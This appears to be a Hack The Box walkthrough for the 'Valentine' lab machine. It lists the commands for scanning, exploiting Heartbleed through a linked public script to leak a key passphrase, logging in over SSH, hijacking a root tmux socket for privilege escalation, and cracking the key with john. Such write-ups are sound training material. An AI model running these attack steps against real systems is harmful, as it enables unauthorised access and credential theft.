# Valentine Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -p- -sV -oA fullvalentine 10.10.10.79``

![image](https://user-images.githubusercontent.com/123066149/226275306-eb574609-4275-4964-858c-8b147bf128df.png)

``nmap --script vuln 10.10.10.79``

![image](https://user-images.githubusercontent.com/123066149/226275482-d6658d91-913a-40a9-a3d5-e6f93adc279d.png)

``sslyze --heartbleed 10.10.10.79``

![image](https://user-images.githubusercontent.com/123066149/226279997-6049896b-91cb-4607-a47d-1ffe4535246e.png)

# ${{\color{purple}Initial Foothold}}\ $

``gobuster dir -u http://10.10.10.79/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 30``

![image](https://user-images.githubusercontent.com/123066149/226275598-b788e58a-00c1-426f-bb9b-a7efd341a082.png)

# ${{\color{purple}Exploitation}}\ $

### Gobuster finds a hype_key file as well as encode and decode directories.

![image](https://user-images.githubusercontent.com/123066149/226276015-3f1bd717-17c1-4b48-9002-afe56c27a67e.png)

![image](https://user-images.githubusercontent.com/123066149/226276237-43b610ce-a170-4f7e-937a-90e61116aa3a.png)

![image](https://user-images.githubusercontent.com/123066149/226276374-46434383-bf4a-4d81-887e-c98f8e5a7a6c.png)

### I used this exploit to exploit heartbleed vulnerability :

https://gist.github.com/eelsivart/10174134#file-heartbleed-py

``python2.7 heartbleed.py 10.10.10.79``

![image](https://user-images.githubusercontent.com/123066149/226276713-88458e71-4a8f-4033-bede-d88004275522.png)

### Decoding the base64 reveals the passphrase for hype_key which can be used to connect via
SSH as the hype user.

``echo -n aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d``

![image](https://user-images.githubusercontent.com/123066149/226276792-4e7158f6-deaf-4959-9e9d-3337fcf97266.png)

``chmod 600 hype.key``

![image](https://user-images.githubusercontent.com/123066149/226277154-225a9196-5d86-4915-a3ba-87b20e1e8f17.png)

``ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa -i hype.key hype@10.10.10.79``

![image](https://user-images.githubusercontent.com/123066149/226277251-a1b78f1e-9e9b-4940-bfce-778226663984.png)

# ${{\color{purple}Privilege Escalation}}\ $

### The content of the bash history file allows me to see that the user uses tmux :

``cat .bash_history``

![image](https://user-images.githubusercontent.com/123066149/226277399-e78d8cd9-bd24-480a-b3b9-2a4d0552002f.png)

### Running ps aux reveals a tmux session being run as the root user.

``ps aux | grep -i tmux``

![image](https://user-images.githubusercontent.com/123066149/226277499-1ee81bd5-02f0-4be1-a646-f64cb3f179e9.png)

``ls -la /.devs/dev_sess``

![image](https://user-images.githubusercontent.com/123066149/226277620-9b7a96b0-d6f9-4bbe-82d0-9bd2c6a8bbc8.png)

### Simply running the command tmux -S /.devs/dev_sess will connect to the session, with full root
privileges :

``export TERM=xterm``
``tmux -S /.devs/dev_sess``

![image](https://user-images.githubusercontent.com/123066149/226277753-c73f7e1c-47b8-4385-a90c-3e6efd09b428.png)

# ${{\color{purple}Points of Improvement}}\ $

* Verify with sslyze to check if the server is vulnerable 
* It's possible to avoid ssh errors by editing the ``~/.ssh/config`` file
* Don't hesitate to replay the exploit to find the right information in memory
* Always run an ``nmap vuln script``
* Another way if there was no vuln heartbleed :

![image](https://user-images.githubusercontent.com/123066149/226278942-de8cf395-1dc1-411b-a403-6d6256e2d706.png)

``ssh2john hype.key > hype_key.hash``

![image](https://user-images.githubusercontent.com/123066149/226279015-5b346708-eb1e-4581-af77-29d4ccac8c97.png)

![image](https://user-images.githubusercontent.com/123066149/226279076-6cf2dffb-63de-49c6-b37b-265fd78f7497.png)

``john --wordlist=/home/kali/Downloads/rockyou.txt hype_key.hash``

![image](https://user-images.githubusercontent.com/123066149/226279210-1f4135c4-832f-4223-9ef4-c227ace94b59.png)

``john --show hype_key.hash``

![image](https://user-images.githubusercontent.com/123066149/226279299-68529ded-91c1-4c32-851c-65bfcc6510cf.png)

